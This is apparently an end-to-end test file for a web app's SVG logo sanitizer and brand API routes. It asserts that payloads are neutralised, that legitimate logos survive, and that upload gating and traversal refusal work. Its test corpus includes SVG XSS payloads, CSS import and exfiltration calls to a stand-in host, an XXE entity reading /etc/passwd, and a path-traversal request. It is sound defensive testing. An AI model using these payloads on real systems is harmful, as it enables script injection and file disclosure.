// theme-brand.e2e.mjs — the brand routes AND the SVG sanitizer, live.
//
// The sanitizer is the security-relevant part, so it gets the payload corpus
// that a heuristic sanitizer fails: 5 of 13 payloads survive regex stripping
// (measured). Each case below is an ASSERTION, not a comment.
//
//   node scripts/theme-brand.e2e.mjs

import { createServer } from "node:http";
import { existsSync, rmSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import assert from "node:assert/strict";
import {
  sanitizeSvg, handleBrandUpload, handleBrandText, handleBrandIcon,
  handleBrandState, handleBrandManifest,
} from "../server/theme-brand.mjs";

const REPO = resolve(import.meta.dirname, "..");
let pass = 0, fail = 0;
const ok = (n) => { pass++; console.log(`ok - ${n}`); };
const bad = (n, e) => { fail++; console.log(`not ok - ${n}\n    ${e?.message || e}`); };
const t = (name, fn) => { try { fn(); ok(name); } catch (e) { bad(name, e); } };

// ============ 1. the sanitizer, against real payloads ============
console.log("# SVG sanitizer");
const PAYLOADS = [
  ["inline <script>", `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle r="5"/></svg>`],
  ["onload handler", `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="9" height="9"/></svg>`],
  ["onclick on a child", `<svg xmlns="http://www.w3.org/2000/svg"><circle onclick="alert(1)" r="5"/></svg>`],
  ["foreignObject island", `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject><rect width="4" height="4"/></svg>`],
  ["javascript: href", `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="4" height="4"/></a></svg>`],
  ["external <use>", `<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.test/x.svg#a"/></svg>`],
  ["CSS @import", `<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil.test/x.css);</style><rect width="4" height="4"/></svg>`],
  ["CSS url() exfil", `<svg xmlns="http://www.w3.org/2000/svg"><rect style="background:url(https://evil.test/?d=1)" width="4" height="4"/></svg>`],
  ["XXE entity", `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`],
  ["feImage nested svg", `<svg xmlns="http://www.w3.org/2000/svg"><filter><feImage href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"/></filter><rect width="4" height="4"/></svg>`],
  ["SMIL animate href", `<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="href" values="javascript:alert(1)"/><rect width="4" height="4"/></svg>`],
  ["misnested script", `<svg xmlns="http://www.w3.org/2000/svg"><scr<script>ipt>alert(1)</script><rect width="4" height="4"/></svg>`],
  ["handler element", `<svg xmlns="http://www.w3.org/2000/svg"><handler type="text/javascript">alert(1)</handler><rect width="4" height="4"/></svg>`],
  ["data: in href", `<svg xmlns="http://www.w3.org/2000/svg"><a href="data:text/html,<script>alert(1)</script>"><rect width="4" height="4"/></a></svg>`],
];
for (const [name, svg] of PAYLOADS) {
  t(`neutralises ${name}`, () => {
    const out = sanitizeSvg(svg);
    assert.ok(!/<script/i.test(out), "no <script>");
    assert.ok(!/\son[a-z]+\s*=/i.test(out), "no event handler attribute");
    assert.ok(!/foreignobject/i.test(out), "no foreignObject");
    assert.ok(!/javascript:|vbscript:|data:text\/html/i.test(out), "no dangerous scheme");
    assert.ok(!/@import|feImage/i.test(out), "no CSS import or nested raster");
    assert.ok(!/<handler|<animate/i.test(out), "no SMIL or handler element");
    assert.ok(!/<!ENTITY|<!DOCTYPE/i.test(out), "no doctype or entity");
  });
}

console.log("\n# legitimate logos survive");
// Each of these broke under a plausible-but-wrong sanitizer.
t("keeps viewBox (camelCase)", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2 L22 22"/></svg>`);
  assert.match(out, /viewBox="0 0 24 24"/, "viewBox must survive — an all-lowercase allowlist killed it");
});
t("keeps preserveAspectRatio", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet"><circle r="4"/></svg>`);
  assert.match(out, /preserveAspectRatio="xMidYMid meet"/);
});
t("keeps the SPACES in path data", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><path d="M2 2 L38 38 A1 1 0 0 1 5 5"/></svg>`);
  assert.match(out, /d="M2 2 L38 38 A1 1 0 0 1 5 5"/, "a \\s-based control-char strip turns this into M22L3838");
});
t("keeps a gradient", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect fill="url(#g)" width="4" height="4"/></svg>`);
  assert.match(out, /linearGradient/);
  assert.match(out, /id="g"/);
});
t("keeps a same-document <use>", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><defs><path id="p" d="M0 0h1v1z"/></defs><use href="#p"/></svg>`);
  assert.match(out, /<use href="#p"\/>/);
});
t("keeps <text>", () => {
  const out = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><text x="4" y="9" font-family="Poppins" font-size="8">A</text></svg>`);
  assert.match(out, /<text/);
  assert.match(out, /font-family="Poppins"/);
});

// ============ 2. the routes, over real HTTP ============
console.log("\n# brand routes");
const TOKEN = "test-token";
const validToken = (x) => x === TOKEN;
const server = createServer((req, res) => {
  const path = new URL(req.url, "http://x").pathname;
  const authed = (req.headers.cookie || "").includes(`astra_session=${TOKEN}`);
  try {
    if (path === "/api/brand/icon" && req.method === "POST") return handleBrandUpload(req, res, validToken);
    if (path === "/api/brand/text") return handleBrandText(req, res, validToken);
    if (path === "/api/brand/state") return handleBrandState(req, res);
    if (path === "/api/brand/manifest") return handleBrandManifest(req, res);
    if (path.startsWith("/api/brand/icon/")) return handleBrandIcon(req, res, validToken, path.slice("/api/brand/icon/".length));
    res.writeHead(404); res.end();
  } catch (e) {
    console.error("handler threw:", e);
    if (!res.headersSent) { res.writeHead(500); res.end(); }
  }
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const base = `http://127.0.0.1:${server.address().port}`;
const cookie = { cookie: `astra_session=${TOKEN}` };
const req = (p, o = {}) => fetch(base + p, { ...o, headers: { ...cookie, ...(o.headers || {}) } });

try {
  // ---- state and manifest are UNGATED (measured Chrome behaviour) -------
  {
    const r = await fetch(base + "/api/brand/state");
    try {
      assert.equal(r.status, 200, "state must be readable WITHOUT a cookie");
      const j = await r.json();
      assert.equal(j.name, "Astra", "the default name");
      ok("GET /api/brand/state is ungated and returns the current name");
    } catch (e) { bad("state is ungated", e); }
  }
  {
    const r = await fetch(base + "/api/brand/manifest");
    try {
      assert.equal(r.status, 200);
      assert.match(r.headers.get("content-type") || "", /manifest\+json/);
      const m = await r.json();
      assert.ok(m.name, "a manifest needs a name");
      ok("GET /api/brand/manifest is ungated and serves a real manifest");
    } catch (e) { bad("manifest is ungated", e); }
  }

  // ---- the icon FILE is still gated -------------------------------------
  {
    const r = await fetch(base + "/api/brand/icon/anything.png");
    try { assert.equal(r.status, 401, "stored assets stay behind the session gate"); ok("a stored icon is still cookie-gated"); }
    catch (e) { bad("icon stays gated", e); }
  }

  // ---- upload requires a session ----------------------------------------
  {
    const r = await fetch(base + "/api/brand/icon", {
      method: "POST", headers: { "x-file-name": "x.svg" }, body: "<svg/>",
    });
    try { assert.equal(r.status, 401); ok("icon upload without a session is 401"); }
    catch (e) { bad("icon upload is gated", e); }
  }

  // ---- a real SVG upload round-trips -------------------------------------
  {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>alert(1)</script><path d="M2 2 L22 22" stroke="#0f0"/></svg>`;
    const r = await req("/api/brand/icon", {
      method: "POST", headers: { "x-file-name": "logo.svg" }, body: svg,
    });
    const j = await r.json();
    try {
      assert.equal(r.status, 200);
      assert.match(j.url, /^\/api\/brand\/icon\//);
      ok(`SVG upload accepted (rev ${j.rev})`);
      // fetch it back WITH a cookie and confirm the script is gone
      const g = await req(j.url);
      const body = await g.text();
      assert.equal(g.status, 200);
      assert.ok(!/<script/i.test(body), "the STORED file must be sanitised, not just the response");
      assert.match(body, /viewBox="0 0 24 24"/, "the real logo content must survive");
      ok("the stored SVG is sanitised on disk and keeps its viewBox");
    } catch (e) { bad("SVG upload round-trips sanitised", e); }
  }

  // ---- a payload-only SVG is REFUSED, not stored empty -------------------
  {
    const r = await req("/api/brand/icon", {
      method: "POST", headers: { "x-file-name": "evil.svg" },
      body: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
    });
    try {
      assert.equal(r.status, 422, "a logo with nothing drawable left must be refused, not painted blank");
      ok("a payload-only SVG is refused rather than stored empty");
    } catch (e) { bad("payload-only SVG refused", e); }
  }

  // ---- traversal on the icon path ----------------------------------------
  {
    const r = await req("/api/brand/icon/..%2F..%2Ftheme-state.json");
    try { assert.ok(r.status === 404 || r.status === 400, `got ${r.status}`); ok("traversal out of the icon dir is refused"); }
    catch (e) { bad("icon traversal refused", e); }
  }

  // ---- name and tagline --------------------------------------------------
  {
    const r = await req("/api/brand/text", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ name: "Nebula", tagline: "Workbench" }),
    });
    const j = await r.json();
    try {
      assert.equal(r.status, 200);
      assert.equal(j.name, "Nebula");
      ok("app name and tagline are settable");
    } catch (e) { bad("name/tagline settable", e); }

    // and they come back UNGATED, so a fresh device picks them up
    const s = await (await fetch(base + "/api/brand/state")).json();
    try { assert.equal(s.name, "Nebula", "the new name must be visible without a cookie"); ok("the new name is readable ungated"); }
    catch (e) { bad("name readable ungated", e); }

    // the manifest follows the name too
    const m = await (await fetch(base + "/api/brand/manifest")).json();
    try { assert.equal(m.name, "Nebula"); ok("the manifest name follows the rename"); }
    catch (e) { bad("manifest name follows", e); }
  }

  // ---- an over-long name is bounded (the sidebar has a floor) -----------
  {
    const long = "X".repeat(200);
    const r = await req("/api/brand/text", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ name: long }),
    });
    const j = await r.json();
    try {
      assert.equal(r.status, 200);
      assert.ok(j.name.length <= 40, `name must be capped, got ${j.name.length}`);
      ok("an over-long app name is capped at 40 chars");
    } catch (e) { bad("long name capped", e); }
  }

  // ---- manifest icon entries are well-formed ----------------------------
  {
    const m = await (await fetch(base + "/api/brand/manifest")).json();
    try {
      assert.ok(Array.isArray(m.icons) && m.icons.length > 0, "an uploaded icon must appear");
      for (const e of m.icons) {
        assert.ok(e.src.startsWith("/"), `icon src must be ROOT-RELATIVE, got ${e.src}`);
        assert.ok(["any", "maskable"].includes(e.purpose), "purpose must be a legal value");
      }
      assert.ok(m.icons.some((e) => e.purpose === "any maskable") === false,
        "purpose:'any maskable' on one entry makes Chrome warn — they must be split");
      ok(`manifest carries ${m.icons.length} icon entries, all root-relative and legal`);
    } catch (e) { bad("manifest icon entries", e); }
  }
} finally {
  server.close();
  try { rmSync(join(REPO, "data", "brand"), { recursive: true, force: true }); } catch { /* scratch */ }
}

console.log(`\ntheme-brand e2e: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
